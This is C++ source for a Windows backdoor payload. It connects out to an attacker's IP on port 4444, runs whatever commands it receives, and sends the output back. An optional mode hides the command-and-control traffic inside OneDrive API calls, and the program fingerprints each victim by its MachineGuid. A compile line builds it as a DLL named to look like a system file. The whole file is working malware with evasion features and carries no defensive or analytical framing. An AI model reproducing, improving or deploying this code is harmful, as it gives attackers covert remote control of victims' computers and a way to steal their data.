//this payload uses the OneDrive API to upload data, including command output to OneDrive. By leveraging the OneDrive API and providing an access token the payload hides its traffic within the legitimate traffic of the OneDrive service, the payload calculates the CRC32 checksum of the MachineGuid and includes it in the communication with the server for identification purposes.

//manual compile: i686-w64-mingw32-g++ -o dfsvc.dll payload.cpp -lws2_32 -static-libgcc -static-libstdc++


#include <iostream>
#include <fstream>
#include <sstream>
#include <winsock2.h>
#include <ws2tcpip.h>
#include <cstdlib>
#include <cstdio>
#include <winreg.h>

#pragma comment(lib, "ws2_32.lib")

using namespace std;

string execute_command(const char* cmd) {
    char buffer[128];
    string result = "";
    FILE* pipe = _popen(cmd, "r");
    if (!pipe) throw runtime_error("_popen() failed!");
    try {
        while (fgets(buffer, sizeof(buffer), pipe) != NULL) {
            result += buffer;
        }
    } catch (...) {
        _pclose(pipe);
        throw;
    }
    _pclose(pipe);
    return result;
}

string get_machine_guid() {
    HKEY hKey;
    if (RegOpenKeyEx(HKEY_LOCAL_MACHINE, "SOFTWARE\\Microsoft\\Cryptography", 0, KEY_READ, &hKey) == ERROR_SUCCESS) {
        char buffer[256];
        DWORD bufferSize = sizeof(buffer);
        if (RegQueryValueEx(hKey, "MachineGuid", NULL, NULL, (LPBYTE)buffer, &bufferSize) == ERROR_SUCCESS) {
            return string(buffer);
        }
        RegCloseKey(hKey);
    }
    return "";
}

DWORD calculate_crc32(const string& data) {
    DWORD crc = 0xFFFFFFFF;
    for (char c : data) {
        crc ^= c;
        for (int i = 0; i < 8; i++) {
            crc = (crc >> 1) ^ (0xEDB88320 & (-(crc & 1)));
        }
    }
    return ~crc;
}

string download_from_onedrive(const string& access_token) {
    string url = "https://graph.microsoft.com/v1.0/me/drive/root:/payload_input.txt:/content";
    string cmd = "curl -H \"Authorization: Bearer " + access_token + "\" " + url;
    return execute_command(cmd.c_str());
}

void upload_to_onedrive(const string& data, const string& access_token) {
    string url = "https://graph.microsoft.com/v1.0/me/drive/root:/payload_output.txt:/content";
    string cmd = "curl -X PUT -H \"Authorization: Bearer " + access_token + "\" -d \"" + data + "\" " + url;
    execute_command(cmd.c_str());
}

void main_loop(const string& ip, int port, const string& access_token = "") {
    SOCKET s;
    sockaddr_in server;

    WSADATA wsData;
    if (WSAStartup(MAKEWORD(2, 2), &wsData) != 0) {
        cout << "WSAStartup failed" << endl;
        return;
    }

    if ((s = socket(AF_INET, SOCK_STREAM, 0)) == INVALID_SOCKET) {
        cout << "Could not create socket" << endl;
        WSACleanup();
        return;
    }

    server.sin_addr.s_addr = inet_addr(ip.c_str());
    server.sin_family = AF_INET;
    server.sin_port = htons(port);

    if (connect(s, (sockaddr*)&server, sizeof(server)) < 0) {
        cout << "Connection failed" << endl;
        closesocket(s);
        WSACleanup();
        return;
    }

    string machine_guid = get_machine_guid();
    if (!machine_guid.empty()) {
        DWORD crc32_checksum = calculate_crc32(machine_guid);
        string payload = "CRC32Checksum: " + to_string(crc32_checksum) + "\n";
        send(s, payload.c_str(), payload.size(), 0);
    }

    char buffer[1024] = {0};
    while (true) {
        string command;
        if (!access_token.empty()) {
            command = download_from_onedrive(access_token);
        } else {
            recv(s, buffer, sizeof(buffer), 0);
            command = string(buffer);
        }

        if (command == "exit\n") break;

        string output = execute_command(command.c_str());

        if (!access_token.empty()) {
            upload_to_onedrive(output, access_token);
        } else {
            send(s, output.c_str(), output.size(), 0);
        }
    }

    closesocket(s);
    WSACleanup();
}

int main() {
    string ip = "192.168.1.1";  // change to the attacker ip
    int port = 4444;              // change to the port the attacker
    string access_token;          // set OneDrive access token

    main_loop(ip, port, access_token);

    return 0;
}

